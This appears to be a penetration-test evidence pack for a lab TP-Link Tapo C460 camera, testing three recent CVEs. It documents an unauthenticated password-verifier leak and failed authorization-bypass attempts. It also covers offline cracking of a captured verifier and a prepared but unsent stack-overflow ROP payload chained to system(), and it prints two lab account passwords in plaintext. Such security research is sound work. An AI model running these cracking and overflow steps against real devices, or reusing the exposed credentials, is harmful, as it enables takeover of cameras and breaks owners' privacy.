# EV pack H-005b — TP-Link Tapo `192.168.4.70`, the 2026-10-19 CVE trio

**Status: PARTIAL.** No session was obtained, so nothing authenticated was sent. Model correction below;
all three CVEs are out of scope for this unit.

**Continuation of H-005.** H-005 mapped the 443 surface and stopped at "one unguessable
secret". This pack drives the three CVEs published 2026-10-19 against the unit itself:
CVE-2026-105815 (unauth credential/crypto leak), CVE-2026-105814 (order-dependent authz
bypass), CVE-2026-105810 (authenticated onboarding overflow → root).

**The first result is a scoping correction. The unit is not either model the CVEs name.**

| field | value | source |
|---|---|---|
| model | **Tapo C460** (`device_name` "Tapo C460") | UDP 20002 TDP discovery, `evidence/excerpts/H-005b/discovery.json` |
| hardware | **1.0** | same |
| firmware | **`1.2.2 Build 260416 Rel.13928n`** | same |
| device_id | `1A9BE858292953388CB7780516C4A4D0` | same |
| owner | `09040B9674478F739BDF0889253BFD8F` | same |
| MAC | `50:3D:D1:E3:E2:07` | ARP + TDP |
| onboarded | `factory_default: false` | TDP |
| exposed ports | 443 (HTTPS JSON), 8800 (Streamd) | connect scan, 13 ports probed |

CVE-2026-105815 and -105814 are scoped to **C210 V3.6 < `V3.6_1.2.7 Build 260818`**;
-105810 to **C320WS V2 < `1.6.6 Build 260917`**. A C460 on a 2026-04 build is outside both
version tables. Everything below is therefore measured, not attributed.

A **second Tapo is on the same account** and was used as a control wherever `.70` was down:
**C660 v1.6, `1.1.7 Build 251226`, `192.168.4.71`** (device_id `E165205C…55A1`, same owner
hash). It gates identically — the whitelisted methods answer `-40407`, everything else
`-40209` — so the gating is platform behaviour, not a C460 quirk.

> Discovery was only possible because 20002 came back after the first reboot. `nmap -Pn`
> still calls 443 filtered while `curl` answers in ~1 s; keep using connect-based probes.

---

## Findings

| # | transport | PA? | class | exact shape | result | evidence |
|---|---|---|---|---|---|---|
| F-1 | HTTPS `POST /` | **yes** | model + identity disclosure | TDP discovery `{"method":"discover"...}` on UDP 20002 | full record incl. model, hw, fw, device_id, owner | `discovery.json` |
| F-2 | HTTPS `POST /` | **yes** | **offline password verifier, unchanged** | `login` + `cnonce`/`encrypt_type:"3"` | `-40413` + `device_confirm` = `SHA256(cnonce+H(pw)+nonce)+nonce+cnonce` | `login.body` |
| F-3 | HTTPS `POST /` | **yes** | pre-dispatch method whitelist | see Shape | only 5 method names get past the gate | `bypass.out`, `bypass2.out` |
| F-4 | HTTPS `/stok=<x>/ds` | **yes** | **verifier on the DS path, empty cnonce** | any whitelisted method with an invalid stok | `-40407` **plus `nonce` and `device_confirm`** | §Shape |
| F-5 | HTTPS `/stok=<x>/ds` | **no** | every non-whitelisted method | `getDeviceInfo`, `motorMove`, `setAccountEnabled`, … | `-40209` | `bypass.out`, `bypass2.out` |
| F-6 | Streamd `:8800` | no | Digest, `encrypt_type="3"`, realm `TP-Link IP-Camera` | `POST /stream` | 401 for every candidate tried | `digest.py` |
| F-7 | HTTPS | — | **availability** | sustained 443 probing | main restarted twice, then the unit left the segment for >40 min; 443 dark, 20002 silent | §Availability |

### F-4 in detail — the DS path hands out a verifier without a session

```
POST /stok=<anything>/ds   {"method":"getConnectStatus","params":{}}
→ 200 {"data":{"code":-40407,"encrypt_type":["3"],"key":"MFww…","nonce":"83F846E1E…",
      "device_confirm":"<64 hex><nonce><empty cnonce>"},"error_code":-40401}
```

The verifier is computed over **an empty cnonce**, i.e. `SHA256("" + H(pw) + nonce)`, so it
cannot be pre-computed against a chosen cnonce but is still a full offline oracle and rotates
per request. This is the strongest reading of 105815 *on this unit*: an unauthenticated DS
request yields `key` (the rotating 512-bit RSA SPKI) plus `nonce` plus a password verifier.
It does **not** yield a usable session by itself: 12 smuggle variants — `seq`, `tapo_tag`,
both, `Cookie: stok=`, `Authorization: Bearer`, `X-Session-Id`, each against a plain and a
`multipleRequest` body — all still returned `-40407` (`hdrsmuggle.out`).

A 4 096-byte base64 `password` in an **unauthenticated** `connectAp` returns 401 in 0.4 s with
no restart beyond a 2 s blip, i.e. the stok check wins and the payload is not decoded. The
overflow therefore really is authenticated-only.

---

## Shape — the exact pre-dispatch surface

The 443 handler routes purely on the JSON `method` string; the URL path (`/`, `/ds`,
`/stok=<x>/ds`) only selects the auth mode. Three tiers exist and were proven by code:

| tier | members | response |
|---|---|---|
| pre-dispatch, no auth | `login`, `multipleRequest`, `scanApList`, `connectAp`, `getConnectStatus` | reach the module, then fail the stok check |
| everything else | all 112 pytapo methods incl. `motorMove`, `getDeviceInfo`, `setAccountEnabled`, `changeAdminPassword` | `-40209` before any module runs |
| `login` only | `login` with `sub_method` (`discover`, `pake_register`, …) | still the V3 negotiation shape; no TPAP |

Telling detail: `scanApList`/`connectAp`/`getConnectStatus` answer with **`-40407` + a fresh
nonce** (the INVALID_STOK branch), while `getDeviceInfo` answers `-40209` (never dispatched).
So the whitelist exists and is exactly the onboarding set — the documented 2025/2026 onboarding
auth holes (CVE-2025-14300 / CVE-2026-78577) all stop at the stok check **because this unit is
already onboarded** (`factory_default: false`). On a factory device they would run.

### 105814 attempt — 34 shapes, all denied

Tested on both `/` and `/stok=<32 zeroes>/ds`: protected operation + public onboarding field in
every position and order — `params.onboarding` before/after the real module object, top-level
`onboarding` before/after `method`, `onboarding.connect` merged into the real params, method
swapped to `scanApList` while the params carry a protected module, and the same two injections
inside `multipleRequest`. Targets: `motorMove` (PTZ), `getDeviceInfo`, `getClockStatus`,
`getLedStatus`, plus six late variants where a whitelisted onboarding method is the **outer** method and
`params.requests` carries the protected call, and both array orders inside `multipleRequest`.
**34/34 → `-40209`/`-40407`, never an execution.** Raw: `bypass.out`, `bypass2.out`.

So the "module-level authz applied inconsistently" behaviour is **not reachable on C460 1.2.2**
with the C210-era field names, or the field that trips it is not `onboarding`.

### Non-finding (and the trap in the brief)

`login` with `sub_method:"pake_register"` and the full TPAP parameter set (user_random,
cipher_suites, passcode_type) still returns the **V3** envelope: this unit does not speak TPAP,
so the MAC-derived `default_userpw` passcode (`HKDF-SHA256(ikm=const‖mac[3:6]‖mac[0:3])`,
`F789…EF59` here) is inert. `encrypt_type` is `["3"]` in every advertisement.

---

## Session

Not obtained. The blocker is unchanged from H-005: `SHA256(password)` is the only secret.

Captured triple (single negotiation, re-usable offline forever):

```
cnonce EE5CA138D413A3D6  nonce C87CEA0BF708DC5D
device_confirm 9E564565B131F3821B8ADB885EA691FBE04D4FF84517357E0D4B97DD467790E7
              C87CEA0BF708DC5DEE5CA138D413A3D6
```

Cracking done (`crack.py`, 1.4 M cand/s, cherry-picked from the H-005 result):

| space | size | result |
|---|---|---|
| rockyou | 14 344 391 | miss |
| rockyou × {1,12,123,1234,12345,123456,!,@,2024,2025,2026,69,99,07,321} + capitalised | 241 634 505 | miss (all three batches) |
| 6-7 digit numeric `100000-9999999` | 9.9 M | miss |
| 8-digit numeric `10000000-99999999` | 90 M | miss |
| 9-digit numeric `100000000-999999999` | 900 M | miss |
| prefix `TPL`/`TPL0`/`Tapo`/`tapo` + 6-digit | 8 M | miss |
| project/owner candidates (franken\*, tapo\*, surveil\*, …) | 1 072 | miss |
| 10-digit numeric | 9 G | running |

Roughly **1.24 × 10⁹ candidates** have been exhausted. `TPL075526460603`, `tapoadmin`, `admin`,
the owner hash, the MAC-derived TPAP passcode and the two lab account passwords
(`Dickles145$`, `g#a#VRNx&*gVUf1`) all fail against both 443 and 8800.

---

## Overflow (CVE-2026-105810)

Mechanism, from the published PoC (`M0ud4/CVE-2026-105810`, C320WS 1.5.3): `onboarding.connect`
base64-decodes `password` into a **fixed 1024-byte stack buffer** while telling mbedTLS the
capacity is `4*((len+2)/3)+1`, i.e. derived from the input. Saved PC sits at decoded offset
`0x424`, so ~1 416 base64 chars is enough. Decode happens before any RSA check, so the payload
need not be a valid ciphertext.

Prepared and validated locally (`exploit.py`): 1 476-char base64, 1 107 decoded bytes, `0xbc`
(the low byte of `pop_r3_pc`) confirmed at `0x424`, command string at `0x458`, chain
`system@plt` → `pop{r3-r8,sb,sl,fp,pc}` → `add r1,sp,#4 ; mov r0,sp ; blx r3`.

Blocked on the session for the send. Offsets are C320WS-specific and **must not be trusted on a
C460**; the C460 non-PIE/ROP layout is unverified.

---

## Availability — and why the overflow stayed unsent

The unit restarted twice inside 40 minutes. Each time: 443 stops answering, ARP goes
incomplete, UDP 20002 goes silent, then it returns with a fresh nonce stream. That is a `main`
restart, not a network blip — and it means **any burst longer than ~25 requests risks a
restart**, which matters for the overflow (a crash and a probe-induced restart are
indistinguishable; only the ~90 s recovery window separates them).

After the third burst stage the unit left the network and did not come back inside the
window. The **C660 control also dropped and then returned**, so the cause is on the shared Wi-Fi
segment rather than a dead camera; the lab subnet churned ~30 addresses during the same period.
Consequence: the authenticated half was never sent, and no liveness verdict for the overflow can
be claimed.

---

## Repro

All raw captures and scripts are in `evidence/excerpts/H-005b/`.

```
python3 - <<'EOF'                      # model + build (needs UDP 20002 to answer)
from kasa import Discover; import asyncio, json
print(asyncio.run(Discover.discover(target="192.168.4.70")).popitem()[1]._discovery_info)
EOF
python3 oracle.py admin                # negotiation + local verifier check
python3 bypass.py /                    # the 105814 matrix (28 shapes)
python3 hdrsmuggle.py 192.168.4.71     # 12 header smuggle variants
python3 exploit.py session --password X && python3 exploit.py overflow --password X
```

`crack.py` takes `capture.json` (a saved cnonce/nonce/device_confirm triple) and a wordlist;
`crack_range.py`/`crack_pre.py` do numeric and prefixed numeric spaces. The generated wordlists
(~3.6 GB) are deleted after use; `mutate*.py` rebuild them from rockyou.

---

## Verdict

**PARTIAL — and mostly a scoping answer.**

*Measured:* the unit is a **C460 v1.0 on 1.2.2 Build 260416**, so none of the three CVEs lists it.
The 443 surface still behaves exactly as H-005 described, and the DS path adds one thing H-005
missed: an unauthenticated request with a bad stok returns a **full `device_confirm` verifier over
an empty cnonce** (F-4). That is the literal "credential material and cryptographic metadata"
of 105815, but it does not hand over a session the way the C210 text promises.

*Refuted here:* 105814's ordering trick does not fire on this build (34 shapes). The onboarding
methods are whitelisted but stok-gated on an onboarded unit, so the older unauth onboarding CVEs
are equally dead.

*Untested end-to-end:* 105810 needs a session; payload is built and validated but unsent.

### What closes this, in order

1. **Session.** Either the owner's password (any 10-digit-space result, or a wordlist we do not
   have), or the `stok` read off a phone that is logged in.
2. The moment a session exists: `getThirdAccount` / `getConnectStatus` / `getDeviceInfo` with and
   without a stok identify exactly which field 105815 leaks; `getBasicInfo` at last settles
   `hw_ver`/`fw_ver` from the device rather than from discovery.
3. Then the overflow send (`python3 exploit.py overflow --password …`), watching 443 for a drop
   and requiring a ≥90 s dark window to call it a crash rather than a probe restart.
4. Re-run `bypass.py` **with a session** to separate "authz never runs" from "module ran and
   returned an auth error".

